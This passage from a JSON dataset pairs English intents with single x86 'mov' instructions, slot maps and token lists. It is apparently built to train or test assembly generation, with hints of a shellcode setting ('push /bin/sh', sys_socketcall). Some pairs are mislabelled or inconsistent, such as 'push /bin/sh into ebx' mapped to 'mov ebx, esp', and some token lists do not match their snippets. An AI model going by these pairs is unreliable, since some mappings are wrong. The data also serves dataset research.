    "rewritten_intent": "move the contents of the esp register into the ebx register",
    "snippet": "mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esp",
      "register",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "point ebx to stack",
    "rewritten_intent": "point ebx to stack",
    "snippet": "mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push /bin/sh into ebx",
    "rewritten_intent": "push /bin/sh into ebx",
    "snippet": "mov ebx, esp",
    "slot_map": {
      "push /bin/sh": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move esp into ebx",
    "rewritten_intent": "move esp into ebx",
    "snippet": "mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move address of stack pointer into ebx",
    "rewritten_intent": "move address of stack pointer into ebx",
    "snippet": "mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "stack",
      "pointer",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move filename into ebx",
    "rewritten_intent": "move filename into ebx",
    "snippet": "mov ebx, filename",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "filename",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "filename"
    ]
  },
  {
    "intent": "move m_src1 to ebx",
    "rewritten_intent": "move m_src1 to ebx",
    "snippet": "mov ebx, m_src1",
    "slot_map": {
      "m_src1": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move m_src2 to ebx",
    "rewritten_intent": "move m_src2 to ebx",
    "snippet": "mov ebx, m_src2",
    "slot_map": {
      "m_src2": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of msg string into ebx",
    "rewritten_intent": "move the address of msg string into ebx",
    "snippet": "mov ebx, msg",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "msg",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "msg"
    ]
  },
  {
    "intent": "move n to ebx",
    "rewritten_intent": "move n to ebx",
    "snippet": "mov ebx, n",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "n",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "n"
    ]
  },
  {
    "intent": "move name into ebx",
    "rewritten_intent": "move name into ebx",
    "snippet": "mov ebx, name",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "name",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "name"
    ]
  },
  {
    "intent": "move address of request variable into ebx",
    "rewritten_intent": "move address of request variable into ebx",
    "snippet": "mov ebx, request",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "request",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "request"
    ]
  },
  {
    "intent": "move sock_reg into ebx",
    "rewritten_intent": "move sock_reg into ebx",
    "snippet": "mov ebx, sock_reg",
    "slot_map": {
      "sock_reg": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the number of bytes of var3 into ebx",
    "rewritten_intent": "move the number of bytes of var3 into ebx",
    "snippet": "mov ebx, type var3",
    "slot_map": {
      "var3": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "number",
      "bytes",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "type",
      "var0"
    ]
  },
  {
    "intent": "move the value of upcase into ebx",
    "rewritten_intent": "move the value of upcase into ebx",
    "snippet": "mov ebx, upcase",
    "slot_map": {
      "upcase": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of x into ebx",
    "rewritten_intent": "move the contents of x into ebx",
    "snippet": "mov ebx, x",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "x",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "x"
    ]
  },
  {
    "intent": "move zero_reg into ebx",
    "rewritten_intent": "move zero_reg into ebx",
    "snippet": "mov ebx, zero_reg",
    "slot_map": {
      "zero_reg": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register",
    "rewritten_intent": "move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register",
    "snippet": "mov ecx, [ebp+12]",
    "slot_map": {
      "ebp+12": "var1",
      "[": "var0",
      "]": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "location",
      "specified",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the address [ebp+12] into ecx",
    "rewritten_intent": "move the contents of the address [ebp+12] into ecx",
    "snippet": "mov ecx, [ebp+12]",
    "slot_map": {
      "ebp+12": "var1",
      "[": "var0",
      "]": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "move",
      "contents",
      "address",
      "[",
      "var1",
      "]",
      "var3"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the 4 bytes of data at address esi+4*eax into ecx",
    "rewritten_intent": "move the 4 bytes of data at address esi+4*eax into ecx",
    "snippet": "mov ecx, [esi+4*eax]",
    "slot_map": {
      "esi+4*eax": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "4",
      "bytes",
      "data",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of esp into ecx",
    "rewritten_intent": "move the contents of esp into ecx",
    "snippet": "mov ecx, [esp]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "move the contents of the esp register into the ecx register",
    "rewritten_intent": "move the contents of the esp register into the ecx register",
    "snippet": "mov ecx, [esp]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esp",
      "register",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "move effective address of my_table in ecx",
    "rewritten_intent": "move effective address of my_table in ecx",
    "snippet": "mov ecx, [my_table]",
    "slot_map": {
      "my_table": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "effective",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address temp3 to ecx",
    "rewritten_intent": "move the contents at memory address temp3 to ecx",
    "snippet": "mov ecx, [temp3]",
    "slot_map": {
      "temp3": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address x to ecx",
    "rewritten_intent": "move the contents at memory address x to ecx",
    "snippet": "mov ecx, [x]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "x",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "x",
      "]"
    ]
  },
  {
    "intent": "move permissions to read write and execute into ecx",
    "rewritten_intent": "move permissions to read write and execute into ecx",
    "snippet": "mov ecx, 0777",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "permissions",
      "read",
      "write",
      "and",
      "execute",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "0777"
    ]
  },
  {
    "intent": "move 0x0 into ecx",
    "rewritten_intent": "move 0x0 into ecx",
    "snippet": "mov ecx, 0x0",
    "slot_map": {
      "0x0": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1 into ecx",
    "rewritten_intent": "move 0x1 into ecx",
    "snippet": "mov ecx, 0x1",
    "slot_map": {
      "0x1": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x88998899 into ecx",
    "rewritten_intent": "move 0x88998899 into ecx",
    "snippet": "mov ecx, 0x88998899",
    "slot_map": {
      "0x88998899": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 1 into ecx",
    "rewritten_intent": "move 1 into ecx",
    "snippet": "mov ecx, 1",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "1",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "get 36 in the ecx",
    "rewritten_intent": "get 36 in the ecx",
    "snippet": "mov ecx, 36",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "get",
      "36",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "36"
    ]
  },
  {
    "intent": "move 4294948047 into ecx",
    "rewritten_intent": "move 4294948047 into ecx",
    "snippet": "mov ecx, 4294948047",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "4294948047",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "4294948047"
    ]
  },
  {
    "intent": "move the value 672274793 into the ecx register",
    "rewritten_intent": "move the value 672274793 into the ecx register",
    "snippet": "mov ecx, 672274793",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "672274793",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "672274793"
    ]
  },
  {
    "intent": "move the address of the arguments into ecx",
    "rewritten_intent": "move the address of the arguments into ecx",
    "snippet": "mov ecx, arguments",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "arguments",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "arguments"
    ]
  },
  {
    "intent": "move the first element of array into ecx",
    "rewritten_intent": "move the first element of array into ecx",
    "snippet": "mov ecx, array",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "first",
      "element",
      "array",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "array"
    ]
  },
  {
    "intent": "move the first element in array2 into ecx",
    "rewritten_intent": "move the first element in array2 into ecx",
    "snippet": "mov ecx, array2",
    "slot_map": {
      "array2": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "first",
      "element",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move b to ecx",
    "rewritten_intent": "move b to ecx",
    "snippet": "mov ecx, b",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "b",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "b"
    ]
  },
  {
    "intent": "move buff to ecx",
    "rewritten_intent": "move buff to ecx",
    "snippet": "mov ecx, buff",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "buff",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buff"
    ]
  },
  {
    "intent": "move the memory address of buffer variable into ecx",
    "rewritten_intent": "move the memory address of buffer variable into ecx",
    "snippet": "mov ecx, buffer",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "memory",
      "address",
      "buffer",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buffer"
    ]
  },
  {
    "intent": "move the memory address of contents string into ecx",
    "rewritten_intent": "move the memory address of contents string into ecx",
    "snippet": "mov ecx, contents",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "memory",
      "address",
      "contents",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "contents"
    ]
  },
  {
    "intent": "move the memory address of contents variable into ecx",
    "rewritten_intent": "move the memory address of contents variable into ecx",
    "snippet": "mov ecx, contents",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "memory",
      "address",
      "contents",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "contents"
    ]
  },
  {
    "intent": "move donemsg into ecx",
    "rewritten_intent": "move donemsg into ecx",
    "snippet": "mov ecx, donemsg",
    "slot_map": {
      "donemsg": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move eatmsg into ecx",
    "rewritten_intent": "move eatmsg into ecx",
    "snippet": "mov ecx, eatmsg",
    "slot_map": {
      "eatmsg": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move eax into ecx",
    "rewritten_intent": "move eax into ecx",
    "snippet": "mov ecx, eax",
    "slot_map": {
      "eax": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move edi into ecx",
    "rewritten_intent": "move edi into ecx",
    "snippet": "mov ecx, edi",
    "slot_map": {
      "edi": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move edx into ecx",
    "rewritten_intent": "move edx into ecx",
    "snippet": "mov ecx, edx",
    "slot_map": {
      "edx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the edx register into the ecx register",
    "rewritten_intent": "move the contents of the edx register into the ecx register",
    "snippet": "mov ecx, edx",
    "slot_map": {
      "edx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "backup edx into ecx",
    "rewritten_intent": "backup edx into ecx",
    "snippet": "mov ecx, edx",
    "slot_map": {
      "edx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "backup",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move esi into ecx",
    "rewritten_intent": "move esi into ecx",
    "snippet": "mov ecx, esi",
    "slot_map": {
      "esi": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "ecx point to the top of the stack",
    "rewritten_intent": "ecx point to the top of the stack",
    "snippet": "mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "var0",
      "point",
      "top",
      "stack"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the address of the stack pointer into ecx",
    "rewritten_intent": "move the address of the stack pointer into ecx",
    "snippet": "mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "stack",
      "pointer",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the contents of esp into ecx",
    "rewritten_intent": "move the contents of esp into ecx",
    "snippet": "mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move address of arguments into ecx",
    "rewritten_intent": "move address of arguments into ecx",
    "snippet": "mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "arguments",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "save the memory location of arg[0] into the ecx register",
    "rewritten_intent": "save the memory location of arg[0] into the ecx register",
    "snippet": "mov ecx, esp",
    "slot_map": {
      "0": "var1",
      "arg[0": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "save",
      "memory",
      "location",
      "arg",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move address of stack pointer into ecx",
    "rewritten_intent": "move address of stack pointer into ecx",
    "snippet": "mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "stack",
      "pointer",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "point ecx to the top of the stack",
    "rewritten_intent": "point ecx to the top of the stack",
    "snippet": "mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "top",
      "stack"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the memory address of our file contents variable into ecx",
    "rewritten_intent": "move the memory address of our file contents variable into ecx",
    "snippet": "mov ecx, filecontents",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "memory",
      "address",
      "our",
      "file",
      "contents",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "filecontents"
    ]
  },
  {
    "intent": "put the offset of hello in ecx",
    "rewritten_intent": "put the offset of hello in ecx",
    "snippet": "mov ecx, hello",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "put",
      "offset",
      "hello",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "hello"
    ]
  },
  {
    "intent": "move hexstr into ecx",
    "rewritten_intent": "move hexstr into ecx",
    "snippet": "mov ecx, hexstr",
    "slot_map": {
      "hexstr": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move m_src3 to ecx",
    "rewritten_intent": "move m_src3 to ecx",
    "snippet": "mov ecx, m_src3",
    "slot_map": {
      "m_src3": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move msg to ecx",
    "rewritten_intent": "move msg to ecx",
    "snippet": "mov ecx, msg",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "msg",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "msg"
    ]
  },
  {
    "intent": "move the address of message string into ecx",
    "rewritten_intent": "move the address of message string into ecx",
    "snippet": "mov ecx, msg",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "message",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "msg"
    ]
  },
  {
    "intent": "move the memory address of message string into ecx",
    "rewritten_intent": "move the memory address of message string into ecx",
    "snippet": "mov ecx, msg",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "memory",
      "address",
      "message",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "msg"
    ]
  },
  {
    "intent": "move starting address of array to ecx",
    "rewritten_intent": "move starting address of array to ecx",
    "snippet": "mov ecx, offset array",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "starting",
      "address",
      "array",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "offset",
      "array"
    ]
  },
  {
    "intent": "move readbuffer into ecx",
    "rewritten_intent": "move readbuffer into ecx",
    "snippet": "mov ecx, readbuffer",
    "slot_map": {
      "readbuffer": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move address of request variable into ecx",
    "rewritten_intent": "move address of request variable into ecx",
    "snippet": "mov ecx, request",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "request",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "request"
    ]
  },
  {
    "intent": "move address of response variable into ecx",
    "rewritten_intent": "move address of response variable into ecx",
    "snippet": "mov ecx, response",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "response",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "response"
    ]
  },
  {
    "intent": "move rm to ecx",
    "rewritten_intent": "move rm to ecx",
    "snippet": "mov ecx, rm",
    "slot_map": {
      "rm": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move rn to ecx",
    "rewritten_intent": "move rn to ecx",
    "snippet": "mov ecx, rn",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "rn",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "rn"
    ]
  },
  {
    "intent": "move the number of bytes of var2 into ecx",
    "rewritten_intent": "move the number of bytes of var2 into ecx",
    "snippet": "mov ecx, type var2",
    "slot_map": {
      "var2": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "number",
      "bytes",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "type",
      "var0"
    ]
  },
  {
    "intent": "move the contents of y into ecx",
    "rewritten_intent": "move the contents of y into ecx",
    "snippet": "mov ecx, y",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "y",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "y"
    ]
  },
  {
    "intent": "move value the contents of memory address ebp+16 into edi",
    "rewritten_intent": "move value the contents of memory address ebp+16 into edi",
    "snippet": "mov edi, [ebp+16]",
    "slot_map": {
      "ebp+16": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move 0x343997b7 into edi",
    "rewritten_intent": "move 0x343997b7 into edi",
    "snippet": "mov edi, 0x343997b7",
    "slot_map": {
      "0x343997b7": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x978cd092 into edi",
    "rewritten_intent": "move 0x978cd092 into edi",
    "snippet": "mov edi, 0x978cd092",
    "slot_map": {
      "0x978cd092": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xada67373 into edi",
    "rewritten_intent": "move 0xada67373 into edi",
    "snippet": "mov edi, 0xada67373",
    "slot_map": {
      "0xada67373": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 876189623 into edi",
    "rewritten_intent": "move 876189623 into edi",
    "snippet": "mov edi, 876189623",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "876189623",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "876189623"
    ]
  },
  {
    "intent": "move 884021143 into edi",
    "rewritten_intent": "move 884021143 into edi",
    "snippet": "mov edi, 884021143",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "884021143",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "884021143"
    ]
  },
  {
    "intent": "move eax into edi",
    "rewritten_intent": "move eax into edi",
    "snippet": "mov edi, eax",
    "slot_map": {
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the return value of sys_socketcall into edi",
    "rewritten_intent": "move the return value of sys_socketcall into edi",
    "snippet": "mov edi, eax",
    "slot_map": {
      "sys_socketcall": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "return",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "eax"
    ]
  },
  {
    "intent": "move ecx into edi",
    "rewritten_intent": "move ecx into edi",
    "snippet": "mov edi, ecx",
    "slot_map": {
      "ecx": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move edx into edi",
    "rewritten_intent": "move edx into edi",
    "snippet": "mov edi, edx",
    "slot_map": {
      "edx": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the remainder into edi",
    "rewritten_intent": "move the remainder into edi",
    "snippet": "mov edi, edx",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "remainder",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "edx"
    ]
  },
  {
    "intent": "move esp into edi",
    "rewritten_intent": "move esp into edi",
    "snippet": "mov edi, esp",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "place hexstr into edi",
    "rewritten_intent": "place hexstr into edi",
    "snippet": "mov edi, hexstr",
    "slot_map": {
      "hexstr": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "place",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the 4 bytes of data at address esi+4*ebx into edx",
    "rewritten_intent": "move the 4 bytes of data at address esi+4*ebx into edx",
    "snippet": "mov edx, [esi+4*ebx]",
    "slot_map": {
      "esi+4*ebx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "4",
      "bytes",
      "data",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of the esp register into the edx register",
    "rewritten_intent": "move the contents of the esp register into the edx register",
    "snippet": "mov edx, [esp]",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "esp",
      "register",
      "var0",
      "register"
    ],
